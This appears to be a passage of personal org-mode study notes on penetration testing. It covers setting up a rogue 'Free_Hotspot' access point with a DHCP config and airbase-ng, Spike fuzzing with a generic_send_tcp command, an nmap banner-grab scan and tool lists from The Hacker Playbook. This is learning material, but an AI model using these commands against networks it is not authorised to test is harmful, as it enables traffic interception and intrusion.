max-lease-time 7200;
subnet 192.168.2.0 netmask 255.255.255.0 {
option subnet-mask 255.255.255.0;
option broadcast-address 192.168.2.255;
option routers 192.168.2.1;
option domain-name-servers 208.67.222.222;
range 192.168.2.51 192.168.2.100;
}
#+END_SRC

- setting up AP
#+BEGIN_SRC sh
airbase-ng --essid "Free_Hotspot" -c 6 wlan0mon
#+END_SRC

*** Metasploit Framework
synflood module by default spoofs the source ip address
*** PWNing system with msf

** Introduction to Packet Analysis
*** [[https://www.youtube.com/watch?v%3DvisrNiKIP3E&t%3D6s][Introduction to TCP/IP Packet Structure]]

** Bug Hunting and Exploit Development - Z. Cliffe Schreuders
url: https://www.youtube.com/watch?v=vFXkDAyIS2w

- Finding Flaws Using Static Analyssis
  
  - Static analysis tools
    - CppCheck
    - Flawfinder
    - RATS
    - VCG
    - Oink (includes Cqual++)
      
  - What to Fuzz
    - Everythin external to the program code!
    - Especially if it crosses a trust boundary
    - examples
      - network protocols, such as service requests
	- incorrect implimentation of the protocol, could throw exceptions
      - file formats
	- possible vulns with file types, media formats hidding code
      - api calls
      - environment variables
	
    - Approaches to fuzzing
      - simple fuzzing - feed input of increasing sizes into a program
      - sequence character input - a sequence of chars what could cause a problem 
      - mutation - takes a standard input/protocol and makes incremental changes
	
    - FOSS Fuzzers
      - Spike - popular framework for specifying fuzzers
	- uses Spike files
	- written in C
      - Sully - network only
      - MSF auxiliary/fuzzers - custom fuzzers built on MSF
	
    - Spike file
      spike_file.spk
      #+BEGIN_EXAMPLE
      s_string("Hello, world!");
      #+END_EXAMPLE
      sends a string
      
      #+BEGIN_EXAMPLE
      s_string_variable("Hello, world!");
      #+END_EXAMPLE
      fuzzes a string
      
      #+BEGIN_EXAMPLE
      s_readline();
      #+END_EXAMPLE
      reads and displays a line of response
      
      #+BEGIN_EXAMPLE
      spike_send();
      #+END_EXAMPLE
      sends what is in the buffer now
      
      #+BEGIN_EXAMPLE
      printf();
      #+END_EXAMPLE
      writes to the local console

    - a Spike file can be launched against a network port or a program using one of Spike's interpreters
    - generic_send_tcp:
      - usage
	#+BEGIN_EXAMPLE
        ./generic_send_tcp host port spike_script SKIPVAR SKIPSTR
	#+END_EXAMPLE
	- using
	#+BEGIN_SRC sh
        generic_send_tcp 192.168.0.10 4444 spike_file.spk 0 0	
	#+END_SRC
	
* Books
** [[file://home/crito/Documents/Security/The-Hacker-Playbook-Practical-Guide-To-Penetration-Testing-2014.pdf][The Hacker Playbok - Practical Guide to Penetration Testing]]
*** Pregame and Before the Snap
- setting up a baseline
  - once you have it ready to run take a snapshot of the vm 

- recommeded distro
  - pentoo

***** high level tool list (Linux)
  - windows credential editor 
  - smbexec 
  - Veil 
  - Discover scripts 
  - Mimikatz 
  - Burp 
  - PeepingTom
  - Powersploit
  - BeEF 
  - Responder
  - Firefox
    - web dev add-on
    - foxy proxy
    - Tamper data
    - User Agent Switch
      
***** high level tool list (windows)
  - HxD
  - Evade
  - Hyperion
  - Cain and Abel
  - Firefox
    - web dev add-on
    - foxy proxy
    - Tamper data
    - User Agent Switch
  - Evil Foca
    
**** Passive Scan 
1. discover sscripts
   - this tool leveridges all the osint tools in one framework
   
2. recon-ng
 
**** Scanning Process
  1. scan using nexpose/nessus (Loud only for auth)
  2. scan with nmap
  3. scan with custom nmap
  4. screen capture with peepingtom

- nmap banner grab
#+BEGIN_SRC sh
nmap --script /usr/share/nmap/scripts/banner-plus.nse --min-rate=400 --min-parallelism=512 -p1-65535 -n -Pn -Ps -oA 192.168.56.102
#+END_SRC
--min-rate=400 - guarantee that the scan will finish after set time
-n - disable dns resolution
-Pn - disable ping

**** Web App Scanning
Tools
  - zap
  - WebScarab
  - Nikto
  - w3af

- Using Burp
 The process  
  - Spider/Discovery/Scanning
  - Scanning with web app scanner
  - Manual parameter injection
  - Session token analysis
    
1. configure network proxy
2. start burp suite
3. spider through the app
4. discover content
5. run the active scanner
6. exploit
   
*** The Drive
- Metasploit

*** The Throw
- SQL Injections
  - SQLmap
  - SQLninja
    
** [[file://home/crito/Documents/Security/Red/Bug-Bounty-Field-Manual-complete-ebook.pdf][Bug Bounty Field Manual]]
* Links
